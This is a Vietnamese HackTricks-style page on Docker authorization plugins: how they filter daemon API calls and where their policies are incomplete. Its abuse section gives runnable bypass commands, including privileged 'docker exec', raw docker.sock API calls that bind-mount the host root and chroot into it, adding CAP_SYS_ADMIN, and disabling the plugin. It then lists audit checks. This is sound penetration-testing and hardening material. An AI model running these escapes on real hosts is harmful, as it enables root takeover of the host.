# Plugin Ủy quyền Runtime

{{#include ../../../banners/hacktricks-training.md}}

## Tổng quan

Plugin ủy quyền Runtime là một lớp chính sách bổ sung quyết định liệu một caller có thể thực hiện một hành động nhất định trên daemon hay không. Docker là ví dụ điển hình. Theo mặc định, bất kỳ ai có thể giao tiếp với Docker daemon đều có quyền kiểm soát rộng đối với daemon này. Plugin ủy quyền cố gắng giới hạn mô hình đó bằng cách kiểm tra người dùng đã xác thực và thao tác API được yêu cầu, sau đó cho phép hoặc từ chối yêu cầu theo chính sách.

Chủ đề này cần có trang riêng vì nó làm thay đổi mô hình khai thác khi attacker đã có quyền truy cập vào Docker API hoặc là người dùng thuộc nhóm `docker`. Trong những môi trường như vậy, câu hỏi không chỉ còn là "tôi có thể truy cập daemon không?" mà còn là "daemon có được bảo vệ bởi một lớp ủy quyền không, và nếu có thì có thể bypass lớp đó qua các endpoint chưa được xử lý, phân tích JSON yếu hoặc quyền quản lý plugin không?"

## Cách hoạt động

Khi một yêu cầu đến Docker daemon, hệ thống ủy quyền có thể chuyển ngữ cảnh yêu cầu đến một hoặc nhiều plugin đã cài đặt. Plugin nhận diện danh tính người dùng đã xác thực, thông tin chi tiết của yêu cầu, các header được chọn và một phần nội dung request hoặc response khi content type phù hợp. Có thể xâu chuỗi nhiều plugin, và quyền truy cập chỉ được cấp nếu tất cả plugin đều cho phép yêu cầu.

Mô hình này nghe có vẻ vững chắc, nhưng độ an toàn hoàn toàn phụ thuộc vào mức độ đầy đủ trong hiểu biết của người viết chính sách về API. Một plugin chặn `docker run --privileged` nhưng bỏ qua `docker exec`, bỏ sót các khóa JSON thay thế như `Binds` ở cấp cao nhất hoặc cho phép quản trị plugin có thể tạo cảm giác hạn chế sai lệch, trong khi vẫn để ngỏ các đường dẫn leo thang đặc quyền trực tiếp.

## Các mục tiêu plugin phổ biến

Các khu vực quan trọng cần rà soát chính sách gồm:

- các endpoint tạo container
- các trường `HostConfig` như `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode` và các tùy chọn chia sẻ namespace
- hành vi của `docker exec`
- các endpoint quản lý plugin
- mọi endpoint có thể gián tiếp kích hoạt hành động runtime nằm ngoài mô hình chính sách dự kiến

Trong lịch sử, các ví dụ như plugin `authz` của Twistlock và các plugin mang tính giáo dục đơn giản như `authobot` giúp việc nghiên cứu mô hình này trở nên dễ dàng, vì các tệp chính sách và luồng xử lý trong mã cho thấy cách ánh xạ endpoint sang hành động được triển khai trên thực tế. Khi đánh giá, bài học quan trọng là người viết chính sách phải hiểu toàn bộ bề mặt API, không chỉ các lệnh CLI dễ thấy nhất.

## Lạm dụng

Mục tiêu đầu tiên là tìm hiểu chính xác những gì bị chặn. Nếu daemon từ chối một hành động, lỗi thường leaks tên plugin, giúp xác định biện pháp kiểm soát đang được sử dụng:

```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```

Nếu cần lập hồ sơ endpoint rộng hơn, các công cụ như `docker_auth_profiler` rất hữu ích vì chúng tự động hóa việc kiểm tra vốn lặp đi lặp lại nhằm xác định chính xác những API route và cấu trúc JSON nào được plugin cho phép.

Nếu môi trường sử dụng plugin tùy chỉnh và bạn có thể tương tác với API, hãy liệt kê những trường đối tượng nào thực sự bị lọc:

```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```

Các kiểm tra này quan trọng vì nhiều lỗi ủy quyền liên quan đến từng trường cụ thể, chứ không phải đến khái niệm. Plugin có thể từ chối một mẫu CLI nhưng không chặn hoàn toàn cấu trúc API tương đương.

### Ví dụ đầy đủ: `docker exec` thêm quyền sau khi tạo container

Một policy chặn việc tạo container ở chế độ privileged nhưng cho phép tạo container unconfined kết hợp với `docker exec` vẫn có thể bị bypass:

```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```

Nếu daemon chấp nhận bước thứ hai, người dùng đã khôi phục được một tiến trình tương tác có đặc quyền bên trong container mà tác giả policy tin rằng đã bị giới hạn.

Một quy tắc `sudo` bị hạn chế cũng có thể mở ra cùng con đường này, ngay cả khi caller không thể truy cập trực tiếp Docker socket. Ví dụ, quyền chạy `/usr/bin/docker exec *` với quyền root có thể cho phép caller cung cấp các tùy chọn `--privileged` và `--user root` của Docker. Vẫn cần có một container đang chạy; trên một số máy chủ Linux, ID của nó hiển thị trong dòng lệnh của tiến trình `containerd-shim` khi lệnh `docker ps` bị từ chối. Hãy xem quy tắc này là một đầu mối cần kiểm tra: xác nhận policy sudo có hiệu lực, các biện pháp kiểm soát authorization của daemon, user namespace và liệu tiến trình được tạo ra có thể truy cập thiết bị trên host hoặc mount trên host có quyền ghi hay không. Docker mô tả các tùy chọn exec trong [tài liệu tham chiếu CLI](https://docs.docker.com/reference/cli/docker/container/exec/).

Một wrapper chạy bằng quyền root nhưng chấp nhận file Compose do caller chọn cần xác thực toàn bộ [mô hình service của Compose](https://docs.docker.com/reference/compose-file/services/), chứ không chỉ từ chối `privileged: true` và yêu cầu `:ro` trên các bind mount. Hãy kiểm tra `cap_add`, `security_opt`, thiết bị, namespace, đầu vào build và mọi cú pháp volume được hỗ trợ. Tùy theo policy của daemon và kernel, bind mount chỉ đọc vẫn có thể trở thành có quyền ghi từ bên trong container nếu container có capability phù hợp và các biện pháp cô lập bảo mật được nới lỏng. Các allowlist đường dẫn host chỉ kiểm tra tiền tố và việc kiểm tra symlink ở thành phần cuối của đường dẫn cũng cần được xem xét. Một quy tắc sudo và lời gọi `docker-compose up` nguyên văn chỉ giúp xác định một trường hợp tiềm năng; khả năng khai thác phụ thuộc vào việc xác thực thực tế của wrapper và các hạn chế của daemon khi chạy.

### Ví dụ đầy đủ: Bind Mount Qua API Thô

Một số policy lỗi chỉ kiểm tra một dạng JSON duy nhất. Nếu bind mount của root filesystem không bị chặn một cách nhất quán, host vẫn có thể được mount:

```bash
docker version
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
  http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```

Ý tưởng tương tự cũng có thể xuất hiện trong `HostConfig`:

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
  http:/v1.41/containers/create
```

Tác động là thoát hoàn toàn khỏi filesystem của host. Chi tiết đáng chú ý là bypass xuất phát từ việc policy bao phủ chưa đầy đủ, chứ không phải từ lỗi kernel.

### Ví dụ đầy đủ: Thuộc tính Capability không được kiểm tra

Nếu policy quên lọc một thuộc tính liên quan đến capability, attacker có thể tạo một container lấy lại được capability nguy hiểm:

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
  http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```

Khi có `CAP_SYS_ADMIN` hoặc một capability mạnh tương tự, có thể thực hiện nhiều kỹ thuật breakout được mô tả trong [capabilities.md](protections/capabilities.md) và [privileged-containers.md](privileged-containers.md).

### Ví dụ đầy đủ: Tắt plugin

Nếu được phép thực hiện các thao tác quản lý plugin, cách bypass gọn nhất có thể là tắt hẳn cơ chế kiểm soát này:

```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```

Đây là lỗi chính sách ở cấp control-plane. Lớp authorization tồn tại, nhưng người dùng mà nó được cho là sẽ hạn chế vẫn có quyền vô hiệu hóa lớp này.

## Kiểm tra

Các lệnh này nhằm xác định xem có lớp chính sách hay không, và liệu lớp đó có vẻ hoàn chỉnh hay chỉ mang tính hình thức.

```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```

Điều gì đáng chú ý ở đây:

- Thông báo từ chối có tên plugin xác nhận có lớp phân quyền và thường tiết lộ chính xác cách triển khai.
- Danh sách plugin mà attacker nhìn thấy có thể đủ để xác định liệu có thể thực hiện các thao tác vô hiệu hóa hoặc cấu hình lại hay không.
- Một policy chỉ chặn các thao tác CLI hiển nhiên nhưng không chặn các yêu cầu API thô thì nên được xem là có thể bypass cho đến khi chứng minh được điều ngược lại.

## Mặc định của Runtime

| Runtime / nền tảng | Trạng thái mặc định | Hành vi mặc định | Các cách làm suy yếu phổ biến |
| --- | --- | --- | --- |
| Docker Engine | Không được bật theo mặc định | Quyền truy cập daemon về cơ bản là được toàn quyền hoặc không có quyền nào, trừ khi đã cấu hình authorization plugin | policy plugin không đầy đủ, dùng blacklist thay vì allowlist, cho phép quản lý plugin, điểm mù ở cấp trường |
| Podman | Không có giải pháp tương đương trực tiếp phổ biến | Podman thường dựa nhiều hơn vào quyền Unix, thực thi rootless và các quyết định về việc để lộ API thay vì authz plugin kiểu Docker | để lộ rộng rãi API Podman chạy root, quyền socket yếu |
| containerd / CRI-O | Mô hình kiểm soát khác | Các runtime này thường dựa vào quyền socket, ranh giới tin cậy của node và các biện pháp kiểm soát ở tầng orchestrator cao hơn thay vì Docker authz plugin | mount socket vào workload, các giả định tin cậy cục bộ trên node yếu |
| Kubernetes | Sử dụng authn/authz ở các tầng API-server và kubelet, không dùng Docker authz plugin | RBAC của cluster và các biện pháp kiểm soát admission là tầng policy chính | RBAC quá rộng, policy admission yếu, để lộ trực tiếp API kubelet hoặc runtime |

{{#include ../../../banners/hacktricks-training.md}}
